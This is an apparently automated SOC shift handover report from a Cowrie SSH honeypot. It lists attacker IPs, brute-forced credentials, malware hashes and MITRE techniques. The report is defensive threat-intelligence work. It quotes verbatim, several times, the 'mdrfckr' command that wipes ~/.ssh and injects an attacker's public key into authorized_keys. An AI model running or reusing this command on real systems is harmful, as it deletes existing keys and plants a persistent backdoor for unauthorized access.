# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-23 |
| **Generated At** | 2026-03-23T07:07:12Z |
| **Shift Time** | 07:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **48** |
| Confirmed Threats | **28** |
| False Positives Filtered | **20** (41.7%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **10** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **43** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **13** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `admin` | 3 |
| `345gs5662d34` | 2 |
| `alexis` | 1 |
| `GET / HTTP/1.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `aaaa1234` | 1 |
| `123` | 1 |
| `Haslo123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `aaaa1234` | 1 |
| `alexis` | `123` | 1 |
| `root` | `Haslo123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `aaaa1234` | `179.32.33.161` | 2026-03-23T05:30:11 |
| `root` | `3245gs5662d34` | `179.32.33.161` | 2026-03-23T05:30:17 |
| `root` | `Haslo123` | `179.32.33.161` | 2026-03-23T05:34:36 |
| `root` | `odroid` | `118.45.101.159` | 2026-03-23T06:53:11 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `179.32.33.161`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **18** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS33915` | Vodafone Libertel B.V. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5a3d55086a58

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-03-23 05:30 |
| **Last Seen** | 2026-03-23 05:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:30:09` | `cowrie.session.connect` |
| `2026-03-23 05:30:09` | `cowrie.client.version` |
| `2026-03-23 05:30:09` | `cowrie.client.kex` |
| `2026-03-23 05:30:11` | `cowrie.login.success` |
| `2026-03-23 05:30:11` | `cowrie.session.params` |
| `2026-03-23 05:30:11` | `cowrie.command.input` |
| `2026-03-23 05:30:11` | `cowrie.command.failed` |
| `2026-03-23 05:30:11` | `cowrie.log.closed` |
| `2026-03-23 05:30:12` | `cowrie.session.params` |
| `2026-03-23 05:30:12` | `cowrie.command.input` |
| `2026-03-23 05:30:12` | `cowrie.session.file_download` |
| `2026-03-23 05:30:12` | `cowrie.log.closed` |
| `2026-03-23 05:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6833f5459285

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-03-23 05:30 |
| **Last Seen** | 2026-03-23 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:30:16` | `cowrie.session.connect` |
| `2026-03-23 05:30:16` | `cowrie.client.version` |
| `2026-03-23 05:30:16` | `cowrie.client.kex` |
| `2026-03-23 05:30:17` | `cowrie.login.success` |
| `2026-03-23 05:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985afb58c15b

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-03-23 05:34 |
| **Last Seen** | 2026-03-23 05:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:34:34` | `cowrie.session.connect` |
| `2026-03-23 05:34:34` | `cowrie.client.version` |
| `2026-03-23 05:34:35` | `cowrie.client.kex` |
| `2026-03-23 05:34:36` | `cowrie.login.success` |
| `2026-03-23 05:34:37` | `cowrie.session.params` |
| `2026-03-23 05:34:37` | `cowrie.command.input` |
| `2026-03-23 05:34:37` | `cowrie.command.failed` |
| `2026-03-23 05:34:37` | `cowrie.log.closed` |
| `2026-03-23 05:34:38` | `cowrie.session.params` |
| `2026-03-23 05:34:38` | `cowrie.command.input` |
| `2026-03-23 05:34:38` | `cowrie.session.file_download` |
| `2026-03-23 05:34:38` | `cowrie.log.closed` |
| `2026-03-23 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6cce708ee6

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-03-23 05:34 |
| **Last Seen** | 2026-03-23 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:34:41` | `cowrie.session.connect` |
| `2026-03-23 05:34:41` | `cowrie.client.version` |
| `2026-03-23 05:34:42` | `cowrie.client.kex` |
| `2026-03-23 05:34:43` | `cowrie.login.success` |
| `2026-03-23 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d81296f306

| Field | Detail |
|---|---|
| **Source IP** | `118.45.101[.]159` |
| **First Seen** | 2026-03-23 06:53 |
| **Last Seen** | 2026-03-23 06:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 06:53:09` | `cowrie.session.connect` |
| `2026-03-23 06:53:09` | `cowrie.client.version` |
| `2026-03-23 06:53:09` | `cowrie.client.kex` |
| `2026-03-23 06:53:11` | `cowrie.login.success` |
| `2026-03-23 06:53:12` | `cowrie.direct-tcpip.request` |
| `2026-03-23 06:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.101[.]159` to AbuseIPDB if not already reported
- [ ] Block `118.45.101[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.32.33[.]161` | **3** | 2026-03-23 05:30 | 2026-03-23 05:34 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.127[.]133` | **2** | 2026-03-23 05:45 | 2026-03-23 05:45 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `20.12.240[.]178` | **2** | 2026-03-23 06:21 | 2026-03-23 06:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.209.65[.]74` | 1 | 2026-03-23 06:53 | 2026-03-23 06:54 | 14s | 0 | `T1592` | 🟢 LOW |
| `103.251.31[.]26` | 1 | 2026-03-23 06:03 | 2026-03-23 06:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.151.225[.]86` | 1 | 2026-03-23 05:41 | 2026-03-23 05:41 | 5s | 0 | `T1592` | 🟢 LOW |
| `111.70.41[.]194` | 1 | 2026-03-23 06:12 | 2026-03-23 06:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.171.222[.]70` | 1 | 2026-03-23 05:59 | 2026-03-23 06:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.75[.]9` | 1 | 2026-03-23 06:42 | 2026-03-23 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.198[.]63` | 1 | 2026-03-23 06:15 | 2026-03-23 06:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.208[.]128` | 1 | 2026-03-23 05:40 | 2026-03-23 05:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.91.85[.]8` | 1 | 2026-03-23 07:02 | 2026-03-23 07:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.173.96[.]253` | 1 | 2026-03-23 06:11 | 2026-03-23 06:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]82` | 1 | 2026-03-23 06:53 | 2026-03-23 06:53 | 1s | 0 | `T1592` | 🟢 LOW |
| `213.124.221[.]2` | 1 | 2026-03-23 05:44 | 2026-03-23 05:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-03-23 05:31 | 2026-03-23 05:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-03-23 06:33 | 2026-03-23 06:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-03-23 06:49 | 2026-03-23 06:49 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.219.112[.]193` | 1 | 2026-03-23 06:31 | 2026-03-23 06:31 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.151.225[.]86` | US | Coosa Valley Technologies Inc | **100** ⚠️ | 3 |
| `121.171.222[.]70` | KR | Korea Telecom | **100** ⚠️ | 24 |
| `60.219.112[.]193` | CN | China Unicom Heilongjiang Province Network | **100** ⚠️ | 14 |
| `175.173.96[.]253` | CN | CHINA UNICOM Liaoning province network | **100** ⚠️ | 0 |
| `172.236.127[.]133` | US | Linode | **100** ⚠️ | 50 |
| `180.94.74[.]82` | AF | GCN/DCN Networks | **100** ⚠️ | 20 |
| `213.124.221[.]2` | NL | Ziggo B2B NL | **100** ⚠️ | 45 |
| `103.209.65[.]74` | IN | GTPL ABHILASH COMMUNICATION PRIVATE LIMITED | **100** ⚠️ | 2 |
| `59.46.182[.]10` | CN | CHINANET liaoning province network | **100** ⚠️ | 33 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 11 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 48 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (41.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 19 recon entry/entries in table (3 group(s) consolidating 7 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-23T07:07:12Z_
